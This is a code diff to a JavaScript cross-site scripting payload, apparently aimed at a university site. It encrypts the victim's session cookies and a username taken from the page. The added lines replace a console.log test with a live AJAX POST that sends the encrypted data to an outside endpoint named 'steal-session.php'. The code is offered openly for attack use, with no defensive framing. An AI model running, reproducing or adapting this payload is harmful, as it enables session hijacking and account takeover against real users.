@@ -1,4 +1,13 @@
-$.getScript('https://cdn.jsdelivr.net/gh/kupihleba/xss/jsencrypt.min.js');
+$.getScript('https://cdn.jsdelivr.net/gh/kupihleba/xss/jsencrypt.min.js', () => {
+	$.ajax({
+		url: "https://ourcoding.space/bmstu/steal-session.php",
+		type: "POST",
+		data: getSession(),
+		cache: false,
+		processData: false, 
+		contentType: "text/plain"
+	});
+});
 function getSession() {
   const pubkey = `-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs5r+e31SzPC0kywYG391
@@ -11,17 +20,10 @@ LQIDAQAB
 -----END PUBLIC KEY-----`;
   const encrypt = new JSEncrypt();
   encrypt.setPublicKey(pubkey);
-  const data = document.cookie;
+  const data = document.cookie + "\n" + $('.dropdown-toggle').text().trim();
   let chunks = [];
   for (let i = 0; i < data.length; i += 245) {
     chunks.push(encrypt.encrypt(data.slice(i, i + 245)));
   }
   return chunks.join('&');
 }
-console.log(getSession());
-/*$.ajax({
-	url: "",
-	type: "POST",
-	data: getSession(),
-	cache: false
-});*/
